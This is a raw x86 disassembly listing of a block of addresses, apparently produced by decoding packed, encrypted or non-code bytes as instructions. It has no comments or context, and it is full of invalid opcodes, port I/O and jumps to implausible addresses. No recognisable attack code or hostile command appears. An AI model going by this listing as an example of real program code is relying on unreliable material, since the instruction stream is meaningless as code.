  40eafc:	aaa    
  40eafd:	inc    eax
  40eafe:	push   edx
  40eaff:	or     ecx,DWORD PTR [edi+0x5c]
  40eb02:	xor    al,ch
  40eb04:	inc    eax
  40eb05:	ret    
  40eb06:	and    ch,BYTE PTR [ebx-0x713e064f]
  40eb0c:	jge    0x40ea95
  40eb0e:	dec    ecx
  40eb0f:	or     al,0x3f
  40eb11:	mov    ebx,0x6b6059e1
  40eb16:	and    DWORD PTR [esi],edx
  40eb18:	add    cl,dl
  40eb1a:	dec    ebp
  40eb1b:	pop    ebx
  40eb1c:	mov    ds:0x6366423d,al
  40eb21:	iret   
  40eb22:	pop    eax
  40eb23:	pop    ebp
  40eb24:	add    edi,DWORD PTR [ebx-0x46862f26]
  40eb2a:	xor    DWORD PTR [eax+0x3cbc81e3],0x8e610651
  40eb34:	(bad)  
  40eb35:	mov    ebp,0xeea52e52
  40eb3a:	jg     0x40ebaa
  40eb3c:	inc    ebx
  40eb3d:	jae    0x40eb18
  40eb3f:	stos   BYTE PTR es:[edi],al
  40eb40:	cli    
  40eb41:	(bad)  [ecx+eax*4-0x5d62cb4e]
  40eb48:	inc    ebp
  40eb49:	imul   ebp,DWORD PTR [ebp+edx*4-0x37],0xbecc06ee
  40eb51:	pop    ebp
  40eb52:	out    0xd,al
  40eb54:	pushf  
  40eb55:	mov    ch,BYTE PTR [edi+ebx*4-0x23ca3e75]
  40eb5c:	neg    DWORD PTR [ebx+0x3dbffb35]
  40eb62:	cmp    edx,DWORD PTR [edi]
  40eb64:	sub    eax,esp
  40eb66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb67:	(bad)  
  40eb69:	(bad)  [ebp-0x13b63b2d]
  40eb6f:	out    dx,al
  40eb70:	jle    0x40ebca
  40eb72:	in     al,0x70
  40eb74:	or     BYTE PTR [ebp-0x78],ch
  40eb77:	sbb    edx,DWORD PTR [ecx]
  40eb79:	or     eax,ebx
  40eb7b:	xchg   ebx,eax
  40eb7c:	push   cs
  40eb7d:	or     ch,bh
  40eb7f:	push   0xbcc12102
  40eb84:	(bad)
  40eb87:	mov    cl,0xd0
  40eb89:	pop    ss
  40eb8a:	inc    esi
  40eb8b:	fbstp  TBYTE PTR [edx-0x3f0ae59]
  40eb91:	fisubr WORD PTR [ebx+0x2dedf75f]
  40eb97:	int    0xd5
  40eb99:	cmp    BYTE PTR [edi-0x5c],cl
  40eb9c:	cmp    al,0xe1
  40eb9e:	push   ecx
  40eb9f:	add    eax,0x4c7174d2
  40eba4:	xchg   ebp,eax
  40eba5:	in     eax,0x89
  40eba7:	outs   dx,BYTE PTR ds:[esi]
  40eba8:	pop    es
  40eba9:	out    dx,eax
  40ebaa:	inc    esp
  40ebab:	iret   
  40ebac:	jle    0x40eb6c
  40ebae:	sbb    al,0x2a
  40ebb0:	clc    
  40ebb1:	das    
  40ebb2:	adc    DWORD PTR [ebp+eax*4-0xfad2ad0],esp
  40ebb9:	dec    ebx
  40ebba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebbb:	hlt    
  40ebbc:	jns    0x40eb4b
  40ebbe:	es pop edi
  40ebc0:	fisub  DWORD PTR [ecx]
  40ebc2:	add    DWORD PTR ds:0xdde285b7,ebp
  40ebc8:	rcr    DWORD PTR [eax+0x2b],cl
  40ebcb:	adc    esi,DWORD PTR [ebp+0xd]
  40ebce:	sub    al,0x42
  40ebd0:	sub    cl,al
  40ebd2:	pop    eax
  40ebd3:	imul   ebp,eax,0x53
  40ebd6:	inc    esp
  40ebd7:	in     al,dx
  40ebd8:	mov    dh,0x83
  40ebda:	mov    ebp,0xc6a1d270
  40ebdf:	stos   DWORD PTR es:[edi],eax
  40ebe0:	dec    esi
  40ebe1:	ss in  al,0x4
  40ebe4:	dec    edx
  40ebe5:	mov    esp,0x6354d621
  40ebea:	ja     0x40eb78
  40ebec:	scas   ax,WORD PTR es:[edi]
  40ebee:	call   0x497d96c1
  40ebf3:	jl     0x40eb7e
  40ebf5:	jnp    0x40ebc5
  40ebf7:	ins    DWORD PTR es:[edi],dx
  40ebf8:	or     bh,dh
  40ebfa:	sub    DWORD PTR [ebx-0x6442f812],0x54
  40ec01:	(bad)  
  40ec02:	jns    0x40ec68
  40ec04:	jle    0x40ec1c
  40ec06:	ret    
  40ec07:	gs dec edi
  40ec09:	sub    eax,esp
  40ec0b:	call   0xa8bb:0x3ef19ff1
  40ec12:	shr    al,cl
  40ec14:	fucomip st,st(5)
  40ec16:	adc    eax,0xc1599f22
  40ec1b:	popa   
  40ec1c:	mov    ds:0x45f8c007,eax
  40ec21:	or     dh,BYTE PTR [ebx+ecx*4]
  40ec24:	test   BYTE PTR [ebx-0x53],ch
  40ec27:	inc    ecx
  40ec28:	mov    edi,0x4be3e50a
  40ec2d:	dec    ebp
  40ec2e:	or     al,0x32
  40ec30:	sub    eax,0x7d28676c
  40ec35:	xchg   DWORD PTR [edx+0x62],ebp
  40ec38:	xor    al,0x67
  40ec3a:	cmp    DWORD PTR [eax],edx
  40ec3c:	dec    ecx
  40ec3d:	hlt    
  40ec3e:	dec    edi
  40ec3f:	mov    ds:0x45874d05,eax
  40ec44:	je     0x40ec0c
  40ec46:	add    BYTE PTR [ebp-0x2da39e3b],bh
  40ec4c:	ins    DWORD PTR es:[edi],dx
  40ec4d:	sbb    cl,BYTE PTR [edi-0x3f]
  40ec50:	mov    bh,0xb5
  40ec52:	cwde   
  40ec53:	jmp    0x40eca5
  40ec55:	fwait
  40ec56:	lods   eax,DWORD PTR ds:[esi]
  40ec57:	xchg   esp,eax
  40ec58:	add    bl,BYTE PTR [ebx+0x558261ea]
  40ec5e:	mov    esp,0x6c1ce862
  40ec63:	mov    esp,0x65679e43
  40ec68:	mov    gs,WORD PTR [edx]
  40ec6a:	ja     0x40ec45
  40ec6c:	push   ebx
  40ec6d:	xor    WORD PTR [eax-0x1c7ee1cb],bx
  40ec74:	inc    ebp
  40ec75:	gs (bad) 
  40ec78:	imul   ebx,DWORD PTR [edx-0x3c],0x569ceb88
  40ec7f:	mov    cl,BYTE PTR [ebx+0x7288b3e5]
  40ec85:	gs scas eax,DWORD PTR es:[edi]
  40ec87:	add    eax,0x407b8987
  40ec8c:	add    edi,0x25c70070
  40ec92:	aad    0x57
  40ec94:	rol    DWORD PTR [eax+0x19e23715],0xc5
  40ec9b:	(bad)  
  40ec9c:	in     eax,dx
  40ec9d:	test   DWORD PTR [edx+0x1c5d360b],0x24035889
  40eca7:	in     eax,dx
  40eca8:	das    
  40eca9:	add    BYTE PTR [esi+0x6a],0x1b
  40ecad:	test   eax,0xccd870b2
  40ecb2:	mov    BYTE PTR [ecx+0x4f0ed0b2],cl
  40ecb8:	push   0xf24ed6cf
  40ecbd:	jmp    0x40ec4a
  40ecbf:	pop    edx
  40ecc0:	icebp  
  40ecc1:	lock dec ebp
  40ecc3:	sar    DWORD PTR [edi+0x30],1
  40ecc6:	call   0x5b10:0x93cc8e4e
  40eccd:	shl    esi,cl
  40eccf:	pop    eax
  40ecd0:	or     DWORD PTR [ebx+0x4d3ecc27],edx
  40ecd6:	pusha  
  40ecd7:	mov    dh,0x1c
  40ecd9:	jecxz  0x40ec76
  40ecdb:	and    BYTE PTR [esi],al
  40ecdd:	mov    BYTE PTR [ecx+0x372d48e],al
  40ece3:	iret   
  40ece4:	aam    0xec
  40ece6:	(bad)  
  40ece7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ece8:	xchg   edx,eax
  40ece9:	mov    al,ds:0xcfe96483
  40ecee:	lock xor BYTE PTR [esi-0x16],0xb4
  40ecf3:	sbb    BYTE PTR ds:0x96be8334,al
  40ecf9:	mov    bl,0x55
  40ecfb:	mov    al,ds:0x82769535
  40ed01:	dec    ebx
  40ed02:	sub    al,0x90
  40ed04:	jae    0x40ed02
  40ed06:	gs add ch,ch
  40ed09:	lock ss mov cs:0x8f02359a,al
  40ed11:	icebp  
  40ed12:	out    0xa3,al
  40ed14:	xchg   BYTE PTR [edx+0x6b],dl
  40ed17:	in     eax,dx
  40ed18:	shl    BYTE PTR [ebp-0x6ea9cdd1],0xb2
  40ed1f:	push   eax
  40ed20:	xchg   edi,eax
  40ed21:	xor    ecx,DWORD PTR [esi-0xdf225e0]
  40ed27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed28:	popa   
  40ed29:	mov    ebp,0xc662a5ea
  40ed2e:	stos   BYTE PTR es:[edi],al
  40ed2f:	xchg   ecx,eax
  40ed30:	jo     0x40ecd8
  40ed32:	data16 cs into 
  40ed35:	rol    BYTE PTR [ecx],1
  40ed37:	scas   al,BYTE PTR es:[edi]
  40ed38:	out    dx,eax
  40ed39:	or     ebx,DWORD PTR [esi-0x50]
  40ed3c:	pop    edi
  40ed3d:	pminsw mm1,QWORD PTR [eax+0x38072ce0]
  40ed44:	dec    edi
  40ed45:	inc    esp
  40ed46:	mov    eax,ds:0x977fc14b
  40ed4b:	retf   0x4393
  40ed4e:	fidiv  WORD PTR [edx-0x5]
  40ed51:	mul    esi
  40ed53:	mov    al,0xa9
  40ed55:	push   ebp
  40ed56:	cmp    dl,BYTE PTR [di-0x2dcd]
  40ed5b:	ins    DWORD PTR es:[edi],dx
  40ed5c:	push   0xfd815761
  40ed61:	sbb    al,0x25
  40ed63:	sahf   
  40ed64:	imul   edi,DWORD PTR [edi+0x1305b7c0],0xfffffff5
  40ed6b:	js     0x40edd8
  40ed6d:	xor    BYTE PTR [ecx+ebp*4-0x95ffe9],dl
  40ed74:	mov    esi,0x433aa9c4
  40ed79:	push   edi
  40ed7a:	out    dx,al
  40ed7b:	(bad)  
  40ed7d:	dec    DWORD PTR [edi-0x10a70832]
  40ed83:	dec    edi
  40ed84:	pop    ds
  40ed85:	and    DWORD PTR [ecx+0x54],esp
  40ed88:	ins    BYTE PTR es:[edi],dx
  40ed89:	shr    BYTE PTR [esi+0x7be397e4],cl
  40ed8f:	jno    0x40edd7
  40ed91:	push   cs
  40ed92:	fcom   st(0)
  40ed94:	add    ebp,DWORD PTR [ebx+0x309db03f]
  40ed9a:	ja     0x40ed55
  40ed9c:	aam    0x4c
  40ed9e:	dec    ecx
  40ed9f:	and    eax,0x3c50f54e
  40eda4:	scas   eax,DWORD PTR es:[edi]
  40eda5:	cli    
  40eda6:	push   esi
  40eda7:	scas   eax,DWORD PTR es:[edi]
  40eda8:	shl    DWORD PTR [edx],0x32
  40edab:	dec    ecx
  40edac:	inc    esp
  40edad:	push   eax
  40edae:	mov    ecx,0x10c576c7
  40edb3:	enter  0x73ba,0xd2
  40edb7:	rcr    DWORD PTR [edx+0x4b85fad5],cl
  40edbd:	rol    DWORD PTR es:[ebx+0x4f],cl
  40edc1:	jl     0x40edba
  40edc3:	lock sti 
  40edc5:	mov    eax,DWORD PTR [edi-0x21da7c06]
  40edcb:	in     eax,0x3d
  40edcd:	pop    ds
  40edce:	leave  
  40edcf:	idiv   BYTE PTR [edi-0x3dce21be]
  40edd5:	test   DWORD PTR [ebp+0x23],ebx
  40edd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edd9:	jp     0x40ed72
  40eddb:	jp     0x40ee19
  40eddd:	mov    edx,0xcc92a642
  40ede2:	popf   
  40ede3:	(bad)  
  40ede4:	pushf  
  40ede5:	ins    BYTE PTR es:[edi],dx
  40ede6:	les    esp,FWORD PTR [eax+0x78]
  40ede9:	xchg   BYTE PTR [ebx-0x7031a64b],bl
  40edef:	add    eax,0xee0abe40
  40edf4:	mov    ebp,0xd2020ed0
  40edf9:	adc    al,0xb7
  40edfb:	popa   
  40edfc:	(bad)  
  40edfe:	push   ds
  40edff:	cmp    ebx,edi
  40ee01:	test   DWORD PTR [edx],eax
  40ee03:	pop    edi
  40ee04:	add    BYTE PTR [ebp+0x5d35bc7f],0x8c
  40ee0b:	(bad)  
  40ee0c:	jae    0x40ee57
  40ee0e:	out    dx,al
  40ee0f:	aad    0xf8
  40ee11:	jmp    DWORD PTR [edi]
  40ee13:	jae    0x40edae
  40ee15:	shl    al,0x8
  40ee18:	mov    edx,0x54ae3aa5
  40ee1d:	sub    al,0xe0
  40ee1f:	sbb    cl,BYTE PTR [edx+ebx*2]
  40ee22:	inc    edi
  40ee23:	add    ebp,esi
  40ee25:	call   FWORD PTR [edi+0x6f]
  40ee28:	repnz sahf 
  40ee2a:	jp     0x40edc4
  40ee2c:	cs icebp 
  40ee2e:	pop    ss
  40ee2f:	or     DWORD PTR [esi+0x3e],edx
  40ee32:	jns    0x40ee19
  40ee34:	ins    DWORD PTR es:[edi],dx
  40ee35:	xchg   esp,eax
  40ee36:	cmp    DWORD PTR [edi+ecx*4],ebp
  40ee39:	repz shl DWORD PTR [edi+0x57599d95],0x5d
  40ee41:	xchg   esi,eax
  40ee42:	call   0x6ff40fbf
  40ee47:	dec    ebx
  40ee48:	jne    0x40ee8f
  40ee4a:	daa    
  40ee4b:	xchg   ebp,eax
  40ee4c:	call   0xa6e4:0xfadff9b0
  40ee53:	add    ah,BYTE PTR [edx+0x2da818ab]
  40ee59:	sbb    al,0x17
  40ee5b:	popf   
  40ee5c:	pop    ebp
  40ee5d:	clc    
  40ee5e:	retf   0x7198
  40ee61:	inc    ecx
  40ee62:	popf   
  40ee63:	fild   QWORD PTR [esi-0x5]
  40ee66:	jmp    DWORD PTR [ebx]
  40ee68:	fst    DWORD PTR [eax+0x73aa6fc5]
  40ee6e:	jle    0x40ee0b
  40ee70:	loop   0x40ee3d
  40ee72:	popf   
  40ee73:	xor    BYTE PTR [esi+0x45],ch
  40ee76:	push   eax
  40ee77:	xor    eax,0x82d3a97a
  40ee7c:	mov    esp,0x102019cd
  40ee81:	mov    esi,0xd6a1e068
  40ee86:	addr16 out dx,al
  40ee88:	test   al,0x96
  40ee8a:	sbb    eax,0x15e54348
  40ee8f:	data16 jp 0x40ee66
  40ee92:	adc    edi,edx
  40ee94:	fisttp DWORD PTR [eax]
  40ee96:	push   esp
  40ee97:	mov    esi,0x9cdcc24f
  40ee9c:	inc    edx
  40ee9d:	in     al,0x89
  40ee9f:	fwait
  40eea0:	cmp    BYTE PTR [esi-0x70dd1eb1],0x3c
  40eea7:	mov    al,ds:0xeeeb5a21
  40eeac:	ja     0x40ee6f
  40eeae:	or     BYTE PTR [eax],0xbe
  40eeb1:	push   esi
  40eeb2:	in     al,0x54
  40eeb4:	adc    dh,BYTE PTR [ebp-0x32]
  40eeb7:	pop    esp
  40eeb8:	fdiv   QWORD PTR [esi-0x20]
  40eebb:	outs   dx,DWORD PTR ds:[esi]
  40eebc:	cmp    bh,BYTE PTR ds:0x9f699149
  40eec2:	imul   esp,DWORD PTR [eax],0x443f5d9d
  40eec8:	repnz mov al,0x90
  40eecb:	cmp    DWORD PTR [ebx],0xffffff90
  40eece:	in     al,dx
  40eecf:	mov    edi,0x32a3f1cf
  40eed4:	mov    esp,0x57b71fa7
  40eed9:	adc    al,0x11
  40eedb:	ss stc 
  40eedd:	sub    dh,BYTE PTR [edi+0x33]
  40eee0:	and    eax,0x42373052
  40eee5:	sub    DWORD PTR [eax-0x3b112f5c],ecx
  40eeeb:	mov    eax,ds:0xcaaa1ec1
  40eef0:	cmp    BYTE PTR [edx-0x6a25c2b],dh
  40eef6:	neg    BYTE PTR [esi+0x4d05f02]
  40eefc:	mov    edi,0xbba05eeb
  40ef01:	shr    DWORD PTR [ecx+edx*2+0x604374c1],1
  40ef08:	test   DWORD PTR [ecx-0x78],0x47d4a236
  40ef0f:	inc    esi
  40ef10:	dec    ecx
  40ef11:	adc    al,ah
  40ef13:	jecxz  0x40eea1
  40ef15:	sub    DWORD PTR [esi+0x31390439],0xffffffbe
  40ef1c:	enter  0x695a,0xe4
  40ef20:	dec    ebx
  40ef21:	push   0xb0752e28
  40ef26:	fldcw  WORD PTR [ebp-0x17d314b3]
  40ef2c:	loop   0x40eee6
  40ef2e:	jp     0x40ef22
  40ef30:	pop    esi
  40ef31:	mov    esi,0x5f99573f
  40ef36:	adc    edi,DWORD PTR [edx+0x59497769]
  40ef3c:	test   ebp,esp
  40ef3e:	lods   eax,DWORD PTR ds:[esi]
  40ef3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef40:	popa   
  40ef41:	repz pop ecx
  40ef43:	mov    bl,BYTE PTR [ecx+0x16]
  40ef46:	jle    0x40ef92
  40ef48:	pop    ecx
  40ef49:	dec    esi
  40ef4a:	fdiv   QWORD PTR [edi+0x23]
  40ef4d:	test   edx,ebp
  40ef4f:	mov    BYTE PTR [ecx-0x45],cl
  40ef52:	addr16 pushf 
  40ef54:	xchg   ecx,eax
  40ef55:	sub    ebx,edi
  40ef57:	xor    al,0xc5
  40ef59:	mov    bh,0xc1
  40ef5b:	call   0x6c74:0xb70e0d11
  40ef62:	int3   
  40ef63:	push   ss
  40ef64:	mov    al,ds:0xbe6ad6cc
  40ef69:	inc    edx
  40ef6a:	inc    esi
  40ef6b:	cmc    
  40ef6c:	and    eax,0xfe7eb880
  40ef71:	jno    0x40efed
  40ef73:	jno    0x40ef90
  40ef75:	and    ebx,eax
  40ef77:	out    dx,eax
  40ef78:	aam    0x89
  40ef7a:	xor    eax,0x8c2a84bc
  40ef7f:	inc    edi
  40ef80:	sbb    DWORD PTR [ebx-0x297bc13b],0x14
  40ef87:	xchg   ebp,eax
  40ef88:	mov    bh,0x3d
  40ef8a:	(bad)  
  40ef8b:	jnp    0x40efd4
  40ef8d:	sub    ecx,esp
  40ef8f:	mov    al,ds:0x8392dd2
  40ef95:	rol    BYTE PTR [esi-0x7c],cl
  40ef98:	jns    0x40efd9
  40ef9a:	pop    es
  40ef9b:	add    DWORD PTR [edx-0x27],0x5f
  40ef9f:	or     DWORD PTR [edi+0x51],ecx
  40efa2:	nop
  40efa3:	mov    ecx,0x27ae99b
  40efa8:	mov    ds:0x57d79567,al
  40efad:	inc    ebx
  40efae:	dec    eax
  40efaf:	mov    esp,0xeb6f212e
  40efb4:	in     al,0x9b
  40efb6:	adc    al,0xf6
  40efb8:	and    ebp,esi
  40efba:	dec    edx
  40efbb:	jmp    0xea72:0xc834a401
  40efc2:	dec    edx
  40efc3:	int3   
  40efc4:	(bad)  
  40efc5:	cmp    eax,0x4ee4d5ce
  40efca:	adc    al,0x4d
  40efcc:	nop
  40efcd:	push   ss
  40efce:	ficomp DWORD PTR [ecx+eiz*4+0x485bb132]
  40efd5:	cmp    al,0x79
  40efd7:	mov    ds:0x65ac338,al
  40efdc:	loopne 0x40efe4
  40efde:	jp     0x40f016
  40efe0:	push   ds
  40efe1:	and    bx,0xff8e
  40efe5:	leave  
  40efe6:	adc    esp,DWORD PTR [esi]
  40efe8:	jl     0x40f028
  40efea:	mov    esi,0xddfa6e3
  40efef:	clc    
  40eff0:	mov    ebp,0x44390134
  40eff5:	cmc    
  40eff6:	or     DWORD PTR [edi+0x13a28f79],eax
  40effc:	aam    0x9c
  40effe:	fcomp  DWORD PTR [ecx+0x4e4e302f]
  40f004:	int    0x59
  40f006:	adc    BYTE PTR [ebx+0x35],cl
  40f009:	hlt    
  40f00a:	test   eax,0xcd21322d
  40f00f:	xor    edx,DWORD PTR [eax+0x37]
  40f012:	push   es
  40f013:	and    ah,al
  40f015:	mov    bh,0x99
  40f017:	shl    bh,0x9c
  40f01a:	call   0x5126cdea
  40f01f:	scas   eax,DWORD PTR es:[edi]
  40f020:	sbb    esp,esi
  40f022:	imul   edi,DWORD PTR [edx],0xfa06cef5
  40f028:	add    al,0x77
  40f02a:	hlt    
  40f02b:	jae    0x40efe2
  40f02d:	jo     0x40f031
  40f02f:	adc    cl,bl
  40f031:	add    dl,bh
  40f033:	lahf   
  40f034:	jg     0x40f033
  40f036:	jns    0x40efe7
  40f038:	iret   
  40f039:	arpl   WORD PTR [di-0x2cb1],bp
  40f03e:	arpl   WORD PTR [esi+0x2ed7e787],bp
  40f044:	xor    DWORD PTR [ebp+ebp*4+0x2],edx
  40f048:	mov    WORD PTR [ecx+0x61],gs
  40f04b:	mov    ebp,0x77d1290d
  40f050:	push   0xffffff9b
  40f052:	mov    cl,0x84
  40f054:	fsubr  DWORD PTR [ecx+esi*4-0x6f]
  40f058:	and    BYTE PTR ds:[eax],dh
  40f05b:	inc    esp
  40f05c:	test   BYTE PTR [edi+0x47],cl
  40f05f:	jmp    0x559cc6a9
  40f064:	iret   
  40f065:	xor    ch,BYTE PTR [ebx+0x5]
  40f068:	addr16 ret 
  40f06a:	ds clc 
  40f06c:	daa    
  40f06d:	sub    BYTE PTR [edi+0x54],ch
  40f070:	mov    ah,0x21
  40f072:	lea    ebp,[eax+0x34]
  40f075:	dec    ecx
  40f076:	dec    ebx
  40f077:	mov    ds:0x22ec8112,eax
  40f07c:	and    al,0x1d
  40f07e:	inc    edi
  40f07f:	jmp    0x40f0b2
  40f081:	sub    al,0xd4
  40f083:	hlt    
  40f084:	sub    BYTE PTR [eax],dh
  40f086:	aad    0x12
  40f088:	jbe    0x40f058
  40f08a:	fisubr WORD PTR [esi]
  40f08c:	jns    0x40f0d2
  40f08e:	xor    dl,BYTE PTR [ecx+0x2dbbf2a8]
  40f094:	jnp    0x40f034
  40f096:	sbb    dh,BYTE PTR [ebx]
  40f098:	not    DWORD PTR [esi]
  40f09a:	cmp    al,0xf6
  40f09c:	jmp    0x73592d81
  40f0a1:	mov    esi,0x5ae21e5f
  40f0a6:	adc    eax,0x974f2fcf
  40f0ab:	jecxz  0x40f079
  40f0ad:	and    esi,ebp
  40f0af:	ss repnz push 0xf2d60f9b
  40f0b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0b7:	popa   
  40f0b8:	inc    esi
  40f0b9:	mov    ch,0x5
  40f0bb:	push   es
  40f0bc:	mov    edi,0xac5b3442
  40f0c1:	imul   ebx,DWORD PTR [esi+edi*2],0x8d8c67aa
  40f0c8:	mov    ecx,0xb315b561
  40f0cd:	out    0x7d,al
  40f0cf:	xor    eax,0xb284ce73
  40f0d4:	xor    ebx,DWORD PTR [ecx+0x78]
  40f0d7:	(bad)  
  40f0d8:	jmp    0xcd98:0xabb0ea0d
  40f0df:	test   DWORD PTR [ecx+0x44],ebp
  40f0e2:	cld    
  40f0e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0e4:	in     al,0xf4
  40f0e6:	inc    edi
  40f0e7:	ja     0x40f092
  40f0e9:	out    0xc6,eax
  40f0eb:	cmp    eax,0xfc5b8025
  40f0f0:	add    esp,DWORD PTR [ecx+0x4fd1d0a7]
  40f0f6:	inc    esp
  40f0f7:	or     al,dl
  40f0f9:	inc    BYTE PTR [eax]
  40f0fb:	dec    edi
  40f0fc:	popa   
  40f0fd:	bound  ebx,QWORD PTR [ecx]
  40f0ff:	cli    
  40f100:	retf   
  40f101:	cmp    al,0xdc
  40f103:	lods   al,BYTE PTR ds:[esi]
  40f104:	inc    DWORD PTR [ecx-0x58cb88e0]
  40f10a:	shl    BYTE PTR [ebp+0x1e4cf6bf],1
  40f110:	jmp    0x8b403afc
  40f115:	imul   edx,DWORD PTR [edi+0x0],0x53
  40f119:	inc    esi
  40f11a:	dec    eax
  40f11b:	rcr    ch,1
  40f11d:	in     eax,0x4f
  40f11f:	out    dx,eax
  40f120:	loopne 0x40f0fe
  40f122:	gs test eax,0xfb738739
  40f128:	out    0xb,al
  40f12a:	cmp    BYTE PTR ds:0x5d8ebefa,cl
  40f130:	mov    ah,al
  40f132:	jg     0x40f0f0
  40f134:	ins    DWORD PTR es:[edi],dx
  40f135:	and    eax,DWORD PTR [esi]
  40f137:	daa    
  40f138:	mov    bl,0xc1
  40f13a:	daa    
  40f13b:	xchg   ebp,eax
  40f13c:	popa   
  40f13d:	stos   BYTE PTR es:[edi],al
  40f13e:	xor    cl,ch
  40f140:	mov    edi,0x33c1ebff
  40f145:	xchg   ecx,eax
  40f146:	test   BYTE PTR [ebx+edx*2+0x4d32cc1d],al
  40f14d:	mov    al,ds:0x9ce7d231
  40f152:	jmp    0x40f145
  40f154:	pushf  
  40f155:	xchg   DWORD PTR [ebp-0x79b394fb],esp
  40f15b:	mov    al,ds:0x23e57c52
  40f160:	je     0x40f19f
  40f162:	loope  0x40f11c
  40f164:	(bad)  
  40f165:	pop    ecx
  40f166:	in     eax,0xec
  40f168:	mov    ebp,DWORD PTR [eax-0x31657d20]
  40f16e:	clc    
  40f16f:	mov    ebx,0x9a5bd7a9
  40f174:	out    0x99,al
  40f176:	cmp    eax,0xf3df7db6
  40f17b:	mov    al,ds:0x53b03a93
  40f180:	sub    DWORD PTR [eax-0x6c248f19],eax
  40f186:	cwde   
  40f187:	dec    ebx
  40f188:	enter  0x1d68,0xac
  40f18c:	neg    DWORD PTR [edx+0xc1319ce]
  40f192:	xchg   ah,dh
  40f194:	daa    
  40f195:	mov    ecx,0xf9689760
  40f19a:	jle    0x40f15d
  40f19c:	std    
  40f19d:	sbb    BYTE PTR [eax+0x55edc29f],cl
  40f1a3:	sbb    al,0x3b
  40f1a5:	jg     0x40f16c
  40f1a7:	sub    BYTE PTR [edi+0x1d],0x45
  40f1ab:	or     ebp,edx
  40f1ad:	and    eax,0x48fb3318
  40f1b2:	rol    BYTE PTR [esi],0x8f
  40f1b5:	jmp    0x40f1f5
  40f1b7:	mov    al,ds:0x3ba01aac
  40f1bc:	(bad)  
  40f1bd:	xchg   ebx,eax
  40f1be:	enter  0x3d6a,0x89
  40f1c2:	sub    eax,0xf9b278ff
  40f1c7:	dec    edi
  40f1c8:	mov    BYTE PTR [esi],dl
  40f1ca:	fcomp  st(7)
  40f1cc:	stc    
  40f1cd:	test   eax,0x62facfcf
  40f1d2:	mov    ebp,0x40bfd964
  40f1d7:	xchg   ecx,eax
  40f1d8:	mov    ah,0x9d
  40f1da:	out    0xf4,eax
  40f1dc:	jl     0x40f248
  40f1de:	mov    esp,0x4f869608
  40f1e3:	test   al,0xdd
  40f1e5:	dec    esp
  40f1e6:	mov    ebp,0x30a5cd9d
  40f1eb:	and    eax,0x8838bfd3
  40f1f0:	in     al,dx
  40f1f1:	out    0xdc,al
  40f1f3:	inc    ebp
  40f1f4:	cmp    ebp,DWORD PTR [eax-0x2b0e0ebc]
  40f1fa:	pop    es
  40f1fb:	adc    eax,0xd30b565b
  40f200:	imul   edi,DWORD PTR [esi],0x6ff532a6
  40f206:	inc    esp
  40f207:	lds    ebp,FWORD PTR [esi-0x6a]
  40f20a:	pusha  
  40f20b:	push   cs
  40f20c:	test   BYTE PTR [eax],dl
  40f20e:	(bad)  
  40f20f:	(bad)  
  40f210:	neg    BYTE PTR [edx-0x4d4010ee]
  40f216:	cmp    edx,DWORD PTR [ecx+0x4652e681]
  40f21c:	dec    esp
  40f21d:	mov    ch,0xec
  40f21f:	in     eax,dx
  40f220:	ins    DWORD PTR es:[edi],dx
  40f221:	mov    esp,0x6aa37563
  40f226:	add    eax,0x8c6befa3
  40f22b:	xchg   esi,eax
  40f22c:	jp     0x40f1c3
  40f22e:	popa   
  40f22f:	xor    BYTE PTR [ebx-0xb],0x1
  40f233:	gs dec ebx
  40f235:	jmp    0x40f2a9
  40f237:	lods   eax,DWORD PTR ds:[esi]
  40f238:	jb     0x40f1fc
  40f23a:	mov    DWORD PTR [ebx-0x482323af],esi
  40f240:	sti    
  40f241:	pop    edi
  40f242:	fwait
  40f243:	add    DWORD PTR [edx+edi*8-0x6d],esp
  40f247:	jnp    0x40f248
  40f249:	jmp    0x40f207
  40f24b:	cmp    ecx,DWORD PTR [esi-0x59]
  40f24e:	in     eax,0xba
  40f250:	mov    ebx,0x86f0857
  40f255:	push   ds
  40f256:	xchg   esi,eax
  40f257:	push   ebp
  40f258:	in     al,dx
  40f259:	stc    
  40f25a:	fiadd  DWORD PTR [ecx-0x4c3cf04f]
  40f260:	cmp    eax,0xab7293af
  40f265:	push   eax
  40f266:	mov    edi,0xb1a10e2e
  40f26b:	add    bh,al
  40f26d:	pop    ebp
  40f26e:	mov    WORD PTR [ebx+0x32],fs
  40f271:	ret    0xeb31
  40f274:	jp     0x40f2f2
  40f276:	push   0xcbfdb992
  40f27b:	sub    al,0xf1
  40f27d:	lock inc edi
  40f27f:	xchg   BYTE PTR [edx-0x4c0ba8af],cl
  40f285:	das    
  40f286:	sbb    al,0xd3
  40f288:	pushf  
  40f289:	sbb    BYTE PTR [ebp-0x682c135a],0xb5
  40f290:	xchg   esp,eax
  40f291:	inc    eax
  40f292:	sub    DWORD PTR [edx],esp
  40f294:	(bad)  
  40f295:	jne    0x40f2ac
  40f297:	xchg   ebp,eax
  40f298:	mov    eax,0x6a6d1b10
  40f29d:	lea    ecx,[esi+0x73e1afe7]
  40f2a3:	lods   al,BYTE PTR ds:[esi]
  40f2a4:	jmp    0x27fed119
  40f2a9:	xchg   edx,eax
  40f2aa:	data16 (bad) 
  40f2ac:	pop    esi
  40f2ad:	jns    0x40f32d
  40f2af:	fsub   st,st(6)
  40f2b1:	mov    al,0x4c
  40f2b3:	xor    BYTE PTR [eax+0x150a2ce3],ch
  40f2b9:	mov    ebp,0x20f45f46
  40f2be:	fnstsw WORD PTR [ebx]
  40f2c0:	hlt    
  40f2c1:	xor    esp,DWORD PTR [edi-0x246173c8]
  40f2c7:	and    DWORD PTR [esi+0xd],edx
  40f2ca:	sub    cl,cl
  40f2cc:	aaa    
  40f2cd:	sbb    bl,bl
  40f2cf:	xchg   esp,eax
  40f2d0:	sbb    al,0x17
  40f2d2:	jmp    0x1af960d2
  40f2d7:	mov    ebx,0xf2581327
  40f2dc:	loope  0x40f301
  40f2de:	cmp    esi,DWORD PTR [edi]
  40f2e0:	fiadd  DWORD PTR [eax+0x2]
  40f2e3:	adc    ah,BYTE PTR ds:0x18b30410
  40f2e9:	nop
